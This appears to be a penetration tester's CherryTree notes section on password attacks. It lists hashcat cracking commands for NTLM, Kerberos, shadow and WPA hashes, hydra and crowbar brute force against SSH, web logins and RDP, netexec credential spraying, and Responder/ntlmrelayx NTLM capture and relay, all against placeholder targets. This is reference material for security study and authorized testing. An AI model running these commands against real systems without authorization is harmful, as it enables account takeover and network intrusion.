    <node name="08. Password Attacks" tags="" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
      <rich_text></rich_text>

      <node name="Hash Identification &amp; Hashcat" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
        <rich_text>hashid &lt;HASH&gt;
# Identify hash algorithm type and Hashcat mode
--------------------------------------------------
hashcat -m 1000 ntlm.txt rockyou.txt --force -O -w 4
# Crack NTLM hashes
--------------------------------------------------
hashcat -m 5600 netntlm.txt rockyou.txt --force -O -w 4
# Crack NetNTLMv2 hashes (Responder captures)
--------------------------------------------------
hashcat -m 13100 tgs.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force -O -w 4
# Crack Kerberoast TGS tickets
--------------------------------------------------
hashcat -m 18200 asrep.txt rockyou.txt --force -O -w 4
# Crack AS-REP Roast tickets
--------------------------------------------------
hashcat -m 1800 shadow.txt rockyou.txt --force -O -w 4
# Crack SHA512crypt Linux shadow hashes ($6$)
--------------------------------------------------
hashcat -m 500 shadow.txt rockyou.txt --force -O -w 4
# Crack MD5crypt Linux shadow hashes ($1$)
--------------------------------------------------
hashcat -m 22000 hashcat.hc22000 rockyou.txt --force -O -w 4
# Crack WPA-PBKDF2-PMKID+EAPOL wireless handshakes
--------------------------------------------------</rich_text>
      </node>

      <node name="Custom Wordlists &amp; Brute Force" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
        <rich_text>cewl http://&lt;TARGET_IP&gt; -m 5 -d 3 -w cewl.txt
# Spider target website to generate contextual wordlist
--------------------------------------------------
hashcat --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule &gt; mutated.txt
# Mutate base wordlist using Hashcat rules
--------------------------------------------------
hydra -l root -P rockyou.txt ssh://&lt;TARGET_IP&gt; -t 4 -V
# SSH brute force
--------------------------------------------------
hydra -l admin -P rockyou.txt &lt;TARGET_IP&gt; http-post-form "/login.php:username=^USER^&amp;password=^PASS^:Invalid"
# HTTP POST form brute force
--------------------------------------------------
crowbar -b rdp -s &lt;TARGET_IP&gt;/32 -u administrator -C rockyou.txt
# RDP brute force
--------------------------------------------------
netexec smb &lt;TARGET_IP&gt; -u users.txt -p passwords.txt --no-bruteforce
netexec winrm &lt;TARGET_IP&gt; -u users.txt -p passwords.txt
# Wide subnet credential sprays targeting SMB and WinRM
--------------------------------------------------</rich_text>
      </node>

      <node name="NTLM Capture &amp; Relay" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
        <rich_text>sudo responder -I tun0 -dwv
# Capture NetBIOS, LLMNR, and MDNS broadcast hashes
--------------------------------------------------
hashcat -m 5600 Responder/logs/HTTP-NTLMv2-*.txt rockyou.txt
# Crack captured Responder hashes
--------------------------------------------------
netexec smb &lt;SUBNET&gt;/24 --gen-relay-list unsigned.txt
# Find hosts with SMB signing disabled for relay
--------------------------------------------------
sudo python3 ntlmrelayx.py -tf unsigned.txt -smb2support
# Relay captured hashes to targets automatically
--------------------------------------------------
sudo python3 ntlmrelayx.py -tf unsigned.txt -smb2support -i
nc 127.0.0.1 &lt;RELAY_PORT&gt;
# Start relay engine in interactive mode for manual shell interception
--------------------------------------------------</rich_text>
